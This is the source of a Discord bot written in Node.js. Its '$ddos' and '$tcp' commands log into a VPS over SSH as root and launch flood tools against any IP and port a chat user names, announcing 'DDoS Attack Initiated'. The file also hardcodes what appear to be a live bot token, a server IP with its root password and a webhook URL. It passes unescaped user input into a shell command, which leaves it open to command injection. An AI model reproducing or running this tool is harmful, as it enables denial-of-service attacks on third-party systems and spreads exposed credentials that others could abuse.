const { Client, GatewayIntentBits, ActivityType, EmbedBuilder, PermissionsBitField } = require('discord.js');
const { Client: SSHClient } = require('ssh2');
const net = require('net');

// Define environment variables directly in the code
const DISCORD_TOKEN = 'MTI2ODY4MDUxNDcxNDM0MTUwMQ.G_VGao.6boJjeMdF4el4tBgCYFfb9mYDHmO4Oh2YWss0A'; 
const VPS_HOST = '62.68.75.56'; 
const VPS_PORT = 22; 
const VPS_PASSWORD = 'Luan2010.'; 
const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1268952879536935064/lt1HHQZfbSjvnDUEcX64q77TsMxKZdv18sz_N7wZTUU2n31yLV6EF7hzg2d0hOGk__qU';

const bot = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

bot.once('ready', async () => {
    console.log('Bot is ready!');

    try {
        // Set the bot's status
        await bot.user.setPresence({
            activities: [{ name: 'lesh.py', type: ActivityType.Playing }],
            status: 'dnd'
        });
        console.log('Status set successfully!');

        // Send message to webhook
        const message = {
            content: '<@1268680514714341501> has started successfully\n\nDevelopers: <@1207108010313515018> and <@1175791147289956373>'
        };

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message)
        });

        console.log('Webhook message sent!');
    } catch (error) {
        console.error('Error starting the bot:', error);
    }
});

bot.on('messageCreate', async message => {
    if (message.author.bot) return;

    if (message.content.startsWith('$ddos')) {
        const args = message.content.split(' ');
        if (args.length !== 5) {
            return message.reply('Usage: ?ddos [IP] [PORT] [PACKAGES] [TIME]');
        }

        const [command, ip, port, packages, time] = args;

        if (!ip || !port || !packages || !time) {
            return message.reply('Invalid arguments. Please provide all parameters.');
        }

        // Connect to the VPS and execute command
        const ssh = new SSHClient();
        ssh.on('ready', () => {
            ssh.exec(`perl /root/ddos/home.pl "${ip}" ${port} ${packages} ${time}`, (err, stream) => {
                if (err) {
                    message.reply(`Error executing command: ${err.message}`);
                    ssh.end();
                    return;
                }

                // Reply immediately after the command is sent
                const embed = new EmbedBuilder()
                    .setTitle('DDoS Attack Initiated')
                    .setDescription(`DDoS command sent to ${ip}. The attack is now underway.`)
                    .setImage('https://cdn.discordapp.com/banners/1175791147289956373/888bf1a04db5e0cd44700efdc3624f78.webp?size=1024&format=webp&width=0&height=192')
                    .setColor('#FF0000');

                message.reply({ embeds: [embed] });

                stream.on('close', (code, signal) => {
                    // Notify when the attack is completed
                    message.reply(`Attack to ${ip} finished.`);
                    ssh.end();
                }).on('data', data => {
                    console.log(`STDOUT: ${data}`);
                }).stderr.on('data', data => {
                    console.error(`STDERR: ${data}`);
                });
            });
        }).connect({
            host: VPS_HOST,
            port: VPS_PORT,
            username: 'root',
            password: VPS_PASSWORD
        });
    }

    if (message.content.startsWith('$tcp')) {
        const args = message.content.split(' ');
        if (args.length !== 6) {
            return message.reply('Usage: ?tcp [METHOD] [IP] [PORT] [TIME] [CONNS]');
        }

        const [command, method, ip, port, time, conns] = args;

        if (!method || !ip || !port || !time || !conns) {
            return message.reply('Invalid arguments. Please provide all parameters.');
        }

        const validMethods = ['GET', 'POST', 'HEAD'];
        if (!validMethods.includes(method.toUpperCase())) {
            return message.reply('Invalid method. Valid methods are: GET, POST, HEAD.');
        }

        // Connect to the VPS and execute command
        const ssh = new SSHClient();
        ssh.on('ready', () => {
            ssh.exec(`./100UP-TCP ${method} ${ip} ${port} ${time} ${conns}`, (err, stream) => {
                if (err) {
                    message.reply(`Error executing command: ${err.message}`);
                    ssh.end();
                    return;
                }

                // Reply immediately after the command is sent
                const embed = new EmbedBuilder()
                    .setTitle('TCP Attack Initiated')
                    .setDescription(`TCP command sent to ${ip}. The attack is now underway.`)
                    .setImage('https://cdn.discordapp.com/banners/1175791147289956373/888bf1a04db5e0cd44700efdc3624f78.webp?size=1024&format=webp&width=0&height=192')
                    .setColor('#FF0000');

                message.reply({ embeds: [embed] });

                stream.on('close', (code, signal) => {
                    // Notify when the attack is completed
                    message.reply(`Attack to ${ip} finished.`);
                    ssh.end();
                }).on('data', data => {
                    console.log(`STDOUT: ${data}`);
                }).stderr.on('data', data => {
                    console.error(`STDERR: ${data}`);
                });
            });
        }).connect({
            host: VPS_HOST,
            port: VPS_PORT,
            username: 'root',
            password: VPS_PASSWORD
        });
    }

    if (message.content.startsWith('$help-tcp')) {
        const helpMessage = `
        **Methods:** GET POST HEAD
        **TIME:** How long the attack will run
        **PORT:** Which port to attack
        **CONNS:** Number of connections
        `;

        message.reply(helpMessage);
    }

    if (message.content.startsWith('$clear')) {
        if (message.author.id !== '1207108010313515018') {
            return message.reply('You do not have permission to use this command.');
        }

        const args = message.content.split(' ');
        const amount = parseInt(args[1], 10);

        if (isNaN(amount) || amount <= 0 || amount > 100) {
            return message.reply('Please provide a number between 1 and 100.');
        }

        try {
            await message.channel.messages.fetch({ limit: amount }).then(messages => {
                message.channel.bulkDelete(messages);
            });
            message.reply(`Successfully deleted ${amount} messages.`);
        } catch (error) {
            console.error('Error while clearing messages:', error);
            message.reply('An error occurred while trying to clear messages.');
        }
    }

    if (message.content.startsWith('$ping')) {
        const args = message.content.split(' ');
        if (args.length !== 3) {
            return message.reply('Usage: ?ping [IP] [PORT]');
        }

        const [command, ip, port] = args;

        if (!ip || !port) {
            return message.reply('Invalid arguments. Please provide both IP and port.');
        }

        let pingResults = [];
        let pingCount = 0;

        const pingServer = () => {
            const socket = new net.Socket();
            const timeout = 2000; // 2 seconds timeout

            socket.setTimeout(timeout);
            socket.on('connect', () => {
                pingResults.push(`Ping ${pingCount + 1}: Successfully connected to ${ip}:${port}`);
                socket.destroy();
                checkCompletion();
            }).on('error', (err) => {
                pingResults.push(`Ping ${pingCount + 1}: Failed to connect to ${ip}:${port}. Error: ${err.message}`);
                checkCompletion();
            }).on('timeout', () => {
                pingResults.push(`Ping ${pingCount + 1}: Connection to ${ip}:${port} timed out.`);
                socket.destroy();
                checkCompletion();
            });

            socket.connect(port, ip);
        };

        const checkCompletion = () => {
            pingCount++;
            if (pingCount < 5) {
                message.reply(`Pinging ${ip}... (${pingCount + 1}/5)`);
                pingServer();
            } else {
                message.reply(pingResults.join('\n'));
            }
        };

        // Start the first ping
        message.reply(`Pinging ${ip}... (1/5)`);
        pingServer();
    }
});

bot.login(DISCORD_TOKEN);
